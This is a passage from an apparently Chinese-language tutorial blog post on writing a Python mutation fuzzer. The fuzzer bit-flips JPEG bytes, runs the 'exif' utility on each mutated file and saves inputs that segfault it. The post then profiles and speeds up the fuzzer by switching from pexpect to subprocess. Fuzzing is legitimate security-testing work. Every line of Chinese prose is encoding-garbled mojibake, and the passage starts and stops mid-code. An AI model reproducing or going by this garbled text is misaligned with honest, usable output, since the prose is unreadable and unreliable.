data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7FFFFFFF</span>            data[picked_index] = <span class="hljs-number">127</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>            <span class="hljs-keyword">return</span> data<span class="hljs-comment"># create new jpg with mutated data</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    command = <span class="hljs-string">&quot;exif mutated.jpg -verbose&quot;</span>    out, returncode = run(<span class="hljs-string">&quot;sh -c &quot;</span> + quote(command), withexitstatus=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Segmentation&quot;</span> <span class="hljs-keyword">in</span> out:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Segfault!&quot;</span>)    <span class="hljs-comment">#if counter % 100 == 0:</span>    <span class="hljs-comment">#print(counter, end=&quot;\r&quot;)</span><span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; <span class="hljs-number">1000</span>:        data = get_bytes(filename)        functions = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]        picked_function = random.choice(functions)        picked_function = <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> picked_function == <span class="hljs-number">0</span>:            mutated = magic(data)            create_new(mutated)            exif(counter,mutated)        <span class="hljs-keyword">else</span>:            mutated = bit_flip(data)            create_new(mutated)            exif(counter,mutated)        counter += <span class="hljs-number">1</span></code></pre><p>ä½ æˆ–è®¸æ³¨æ„åˆ°ä¸€äº›æ”¹å˜ï¼Œæˆ‘ä»¬æ”¹äº†ï¼š</p><ul><li>æ¯100æ¬¡è¿­ä»£æ³¨é‡Šæ‰è¿­ä»£è®¡æ•°å™¨çš„æ‰“å°è¯­å¥</li><li>æ·»åŠ ç”¨äºæé†’æˆ‘ä»¬ä»»ä½•<code>Segfaults</code>çš„æ‰“å°è¯­å¥</li><li>ç¡¬ç¼–ç 1kæ¬¡è¿­ä»£</li><li>ä¸´æ—¶æ·»åŠ ä¸€è¡Œæ–°ä»£ç <code>picked_function=1</code>ï¼Œä»¥ä¾¿æˆ‘ä»¬æ¶ˆé™¤æˆ‘ä»¬æµ‹è¯•ä¸­çš„éšæœºæ€§ï¼Œæˆ‘ä»¬åªä¸€ç›´ç”¨ä¸€ç§å˜å¼‚ç­–ç•¥ï¼ˆ<code>bit_flip()</code>ï¼‰</li></ul><p>è®©æˆ‘ä»¬ç”¨ä¸€äº›åˆ†æå·¥å…·è·‘æˆ‘ä»¬æ–°ç‰ˆçš„<code>fuzzer</code>ï¼Œæˆ‘ä»¬å¯ä»¥å®é™…åˆ†æåœ¨æˆ‘ä»¬ç¨‹åºæ‰§è¡Œæ—¶æˆ‘ä»¬èŠ±è´¹çš„æ—¶é—´</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>cProfile</code>çš„<code>Python module</code>ï¼Œçœ‹çœ‹åœ¨<code>1000</code>æ¬¡<code>fuzzing</code>è¿­ä»£ä¸­æˆ‘ä»¬æŠŠæ—¶é—´èŠ±åœ¨å“ªé‡Œäº†ï¼Œå¦‚æœä½ è¿˜è®°å¾—çš„ï¼Œè¿™ä¸ªç¨‹åºä¼šæŠŠä¸€ä¸ªåˆè§„çš„<code>JPEG</code>æ–‡ä»¶ä½œä¸ºè·¯å¾„å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å®Œæ•´çš„å‘½ä»¤è¡Œè¯­æ³•å°±åƒ<code>python3 -m cProfile -s cumtime JPEGfuzzer.py ~/jpegs/Canon_40D.jpg</code>æ‰€ç¤ºã€‚</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ·»åŠ è¿™ä¸ª<code>cProfile</code>å·¥å…·ä¼šé™ä½æ€§èƒ½ï¼Œæˆ‘æµ‹è¯•æ—¶æ˜¯æ²¡å¸¦è¿™ä¸ªå·¥å…·ï¼Œåœ¨è¯¥æ–‡ç« ä¸­å¯¹äºè¿™ä¸ªè¿­ä»£å¤§å°ï¼Œè¿™ä¼¼ä¹æ˜¯ä¸ä¼šé€ æˆæ˜¾è‘—å·®å¼‚</strong></p><p>åœ¨è¿™æ¬¡è¿è¡Œä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¨‹åºçš„è¾“å‡ºï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œä¸­æˆ‘ä»¬æœ€èŠ±æ—¶é—´çš„åœ°æ–¹ã€‚</p><pre><code class="hljs yaml"><span class="hljs-number">2476093</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(2474812</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">122.084</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">33</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">122.084</span>  <span class="hljs-number">122.084</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">0.108</span>    <span class="hljs-number">0.108</span>  <span class="hljs-number">122.084</span>  <span class="hljs-number">122.084</span> <span class="hljs-string">blog.py:3(&lt;module&gt;)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.090</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">118.622</span>    <span class="hljs-number">0.119</span> <span class="hljs-string">blog.py:140(exif)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.080</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">118.452</span>    <span class="hljs-number">0.118</span> <span class="hljs-string">run.py:7(run)</span>     <span class="hljs-number">5432  </span><span class="hljs-number">103.761</span>    <span class="hljs-number">0.019</span>  <span class="hljs-number">103.761</span>    <span class="hljs-number">0.019</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">time.sleep</span>&#125;     <span class="hljs-number">1000    </span><span class="hljs-number">0.028</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">100.923</span>    <span class="hljs-number">0.101</span> <span class="hljs-string">pty_spawn.py:316(close)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.025</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">100.816</span>    <span class="hljs-number">0.101</span> <span class="hljs-string">ptyprocess.py:387(close)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.061</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.949</span>    <span class="hljs-number">0.010</span> <span class="hljs-string">pty_spawn.py:36(__init__)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.074</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.764</span>    <span class="hljs-number">0.010</span> <span class="hljs-string">pty_spawn.py:239(_spawn)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.041</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">8.682</span>    <span class="hljs-number">0.009</span> <span class="hljs-string">pty_spawn.py:312(_spawnpty)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.266</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">8.641</span>    <span class="hljs-number">0.009</span> <span class="hljs-string">ptyprocess.py:178(spawn)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.011</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.491</span>    <span class="hljs-number">0.007</span> <span class="hljs-string">spawnbase.py:240(expect)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.036</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.479</span>    <span class="hljs-number">0.007</span> <span class="hljs-string">spawnbase.py:343(expect_list)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.128</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.409</span>    <span class="hljs-number">0.007</span> <span class="hljs-string">expect.py:91(expect_loop)</span>     <span class="hljs-number">6432    </span><span class="hljs-number">6.473</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">6.473</span>    <span class="hljs-number">0.001</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;     <span class="hljs-number">5432    </span><span class="hljs-number">0.089</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.818</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">pty_spawn.py:415(read_nonblocking)</span>     <span class="hljs-number">7348    </span><span class="hljs-number">0.029</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.162</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">utils.py:130(select_ignore_interrupts)</span>     <span class="hljs-number">7348    </span><span class="hljs-number">3.127</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.127</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">select.select</span>&#125;     <span class="hljs-number">1000    </span><span class="hljs-number">0.790</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">1.777</span>    <span class="hljs-number">0.002</span> <span class="hljs-string">blog.py:15(bit_flip)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.015</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.311</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">blog.py:134(create_new)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">0.100</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.101</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">pty.py:79(fork)</span>     <span class="hljs-number">1000    </span><span class="hljs-number">1.000</span>    <span class="hljs-number">0.001</span>    <span class="hljs-number">1.000</span>    <span class="hljs-number">0.001</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.forkpty</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>å¯¹äºè¿™ç§ç±»å‹çš„åˆ†æï¼Œæˆ‘ä»¬å¹¶ä¸çœŸæ­£å…³å¿ƒæˆ‘ä»¬æœ‰å¤šå°‘<code>segfaults</code>ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰çœŸæ­£ä¿®æ”¹å˜å¼‚æ–¹æ³•æˆ–æ¯”è¾ƒä¸åŒçš„æ–¹æ³•ã€‚å½“ç„¶è¿™é‡Œä¼šæœ‰ä¸€äº›éšæœºæ€§ï¼Œå› ä¸º<code>crash</code>éœ€è¦é¢å¤–çš„å¤„ç†ï¼Œä½†ç°åœ¨å°±å¯ä»¥äº†ã€‚</p><p>æˆ‘åªæˆªäº†æˆ‘ä»¬ç´¯è®¡èŠ±è´¹äº†è¶…è¿‡<code>1.0s</code>çš„ä»£ç æ®µï¼Œä½ å¯ä»¥çœ‹åˆ°è¿„ä»Šä¸ºæ­¢æˆ‘ä»¬èŠ±è´¹äº†æœ€å¤šçš„æ—¶é—´åœ¨<code>blog.py:140(exif)</code>ï¼Œåœ¨<code>122s</code>ä¸­å äº†æƒŠäººçš„<code>118s</code>ï¼Œæˆ‘ä»¬<code>exif()</code>å‡½æ•°ä¼¼ä¹æˆä¸ºæˆ‘ä»¬æ€§èƒ½çš„æœ€å¤§çš„é—®é¢˜ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªå‡½æ•°ä¸‹æˆ‘ä»¬èŠ±è´¹çš„å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯ç›´æ¥è·Ÿè¿™ä¸ªå‡½æ•°ç›¸å…³çš„ï¼Œä»<code>pexpect</code>ç”¨æ³•ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¤§é‡å¯¹<code>pty</code>æ¨¡å—çš„è¯‰æ±‚ï¼ˆ<code>appeal to the pty module</code>ï¼Œç¬”è€…æ„Ÿè§‰å°±æ˜¯å¯¹è¯¥æ¨¡å—çš„è°ƒç”¨ï¼‰ï¼Œè®©æˆ‘ä»¬é‡å†™æˆ‘ä»¬çš„å‡½æ•°ç”¨<code>subprocess</code>æ¨¡å—çš„<code>Popen</code>ï¼Œçœ‹çœ‹æ˜¯å¦æˆ‘ä»¬å¯ä»¥æå‡æ€§èƒ½å§ã€‚</p><p>æˆ‘ä»¬é‡å®šä¹‰<code>exif()</code>å‡½æ•°å¦‚ä¸‹ï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    p = Popen([<span class="hljs-string">&quot;exif&quot;</span>, <span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;-verbose&quot;</span>], stdout=PIPE, stderr=PIPE)    (out,err) = p.communicate()    <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">-11</span>:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Segfault!&quot;</span>)    <span class="hljs-comment">#if counter % 100 == 0:</span>    <span class="hljs-comment">#print(counter, end=&quot;\r&quot;)</span></code></pre><p>æˆ‘ä»¬çš„æ€§èƒ½æŠ¥å‘Šå¦‚ä¸‹ï¼š</p><pre><code class="hljs profile"><span class="hljs-number">2065580</span> function calls (<span class="hljs-number">2065443</span> primitive calls) in <span class="hljs-number">2.756</span> seconds   Ordered by: cumulative time   <span class="hljs-keyword">ncalls</span>  <span class="hljs-keyword">tottime</span>  percall  <span class="hljs-keyword">cumtime</span>  percall <span class="hljs-keyword">filename</span>:lineno(function)     <span class="hljs-number">15</span>/<span class="hljs-number">1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.756</span>    <span class="hljs-number">2.756</span> &#123;built-in method builtins.exec&#125;        1    0.038    0.038    2.756    2.756 subpro.py:<span class="hljs-number">3</span>(<span class="hljs-string">&lt;module&gt;</span>)     <span class="hljs-number">1000</span>    <span class="hljs-number">0.020</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.917</span>    <span class="hljs-number">0.002</span> subpro.py:<span class="hljs-number">139</span>(<span class="hljs-string">exif</span>)     <span class="hljs-number">1000</span>    <span class="hljs-number">0.026</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.121</span>    <span class="hljs-number">0.001</span> subprocess.py:<span class="hljs-number">681</span>(<span class="hljs-string">__init__</span>)     <span class="hljs-number">1000</span>    <span class="hljs-number">0.099</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.045</span>    <span class="hljs-number">0.001</span> subprocess.py:<span class="hljs-number">1412</span>(<span class="hljs-string">_execute_child</span>) -----SNIP-----</code></pre><p>åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Œè¿™ç”¨é‡å®šä¹‰çš„<code>exif()</code>å‡½æ•°çš„<code>fuzzer</code>åœ¨ç›¸åŒæ•°ç›®çš„å·¥ä½œé‡ä¸‹ä»…ä»…éœ€è¦<code>2s</code>ï¼ï¼ä»¥å‰çš„<code>fuzzer: 122s</code>ï¼Œæ–°çš„<code>fuzzer: 2.7s</code></p><h2 id="Improving-Further-in-Python"><a href="#Improving-Further-in-Python" class="headerlink" title="Improving Further in Python"></a>Improving Further in Python</h2><p>è®©æˆ‘ä»¬å°è¯•åœ¨<code>Python</code>ä¸­ç»§ç»­æ”¹è¿›æˆ‘ä»¬çš„<code>fuzzer</code>,é¦–å…ˆï¼Œè®©æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªå¥½çš„åŸºå‡†ï¼Œå¯ä»¥è®©æˆ‘ä»¬å¯¹ç…§ç€æ‰§è¡Œï¼Œæˆ‘ä»¬å°†è®©æˆ‘ä»¬çš„ä¼˜åŒ–çš„<code>Python fuzzer</code>è¿­ä»£50000æ¬¡ï¼Œæˆ‘ä»¬å°†å†æ¬¡ä½¿ç”¨<code>cProfile</code>æ¨¡å—æ¥è·å¾—ä¸€äº›å…³äºæˆ‘ä»¬èŠ±è´¹æ—¶é—´çš„ç»†ç²’åº¦ç»Ÿè®¡ã€‚</p><pre><code class="hljs yaml"><span class="hljs-number">102981395</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(102981258</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">141.488</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">15</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">141.488</span>  <span class="hljs-number">141.488</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">1.724</span>    <span class="hljs-number">1.724</span>  <span class="hljs-number">141.488</span>  <span class="hljs-number">141.488</span> <span class="hljs-string">subpro.py:3(&lt;module&gt;)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.992</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">102.588</span>    <span class="hljs-number">0.002</span> <span class="hljs-string">subpro.py:139(exif)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.248</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">61.562</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:681(__init__)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">5.034</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">57.826</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1412(_execute_child)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.437</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">39.586</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:920(communicate)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">2.527</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">39.064</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1662(_communicate)</span>   <span class="hljs-number">208254</span>   <span class="hljs-number">37.508</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">37.508</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;   <span class="hljs-number">158238</span>    <span class="hljs-number">0.577</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">28.809</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:402(select)</span>   <span class="hljs-number">158238</span>   <span class="hljs-number">28.131</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">28.131</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;poll&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;select.poll&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>   <span class="hljs-number">11.784</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">25.819</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subpro.py:14(bit_flip)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.666</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">10.431</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:256(choice)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">8.421</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">8.421</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">_posixsubprocess.fork_exec</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.162</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.358</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:133(create_new)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">4.096</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">6.130</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:224(_randbelow)</span>   <span class="hljs-number">203090</span>    <span class="hljs-number">5.016</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">5.016</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">io.open</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">4.211</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.211</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedRandom&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.643</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.194</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:617(get_exec_path)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.733</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.356</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:8(get_bytes)</span> <span class="hljs-number">35866791</span>    <span class="hljs-number">2.635</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.635</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;append&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;list&#x27;</span> <span class="hljs-string">objects</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.070</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.960</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1014(wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.252</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.902</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:351(register)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.444</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.890</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1621(_wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.675</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.583</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:234(register)</span>   <span class="hljs-number">350000</span>    <span class="hljs-number">0.432</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.501</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1471(&lt;genexpr&gt;)</span> <span class="hljs-number">12074141</span>    <span class="hljs-number">1.434</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.434</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;getrandbits&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.059</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.358</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1608(_try_wait)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.299</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.299</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.waitpid</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.488</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.058</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:674(__getitem__)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">1.017</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.017</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedReader&#x27;</span> <span class="hljs-string">objects</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>50000æ¬¡è¿­ä»£æ€»å…±èŠ±è´¹äº†æˆ‘ä»¬141sï¼Œä¸æˆ‘ä»¬æ­£åœ¨å¤„ç†çš„ç›¸æ¯”ï¼Œè¿™ä¸ªæ€§èƒ½æ˜¯ä¸é”™çš„äº†ï¼Œæˆ‘ä»¬ä¹‹å‰åš1000æ¬¡è¿­ä»£å¯ç”¨äº†122sï¼å†æ¬¡è¿‡æ»¤åªåœ¨æˆ‘ä»¬èŠ±è´¹äº†è¶…è¿‡1.0sæ—¶é—´çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å‘ç°è¿˜æ˜¯åœ¨<code>exif()</code>ä¸­èŠ±è´¹äº†å¤§éƒ¨åˆ†æ—¶é—´ï¼Œä½†æ˜¯æˆ‘ä»¬åŒæ ·åœ¨<code>bit_flip()</code>ä¸­ä¹Ÿå‘ç°äº†ä¸€äº›æ€§èƒ½é—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨è¿™ç´¯è®¡èŠ±è´¹äº†25sï¼Œè®©æˆ‘ä»¬å°è¯•ä¼˜åŒ–ä¸€ç‚¹è¿™ä¸ªå‡½æ•°å§ã€‚</p><p>è®©æˆ‘ä»¬ç»§ç»­å¹¶è´´å‡ºæ—§<code>bit_flip()</code>å‡½æ•°</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> 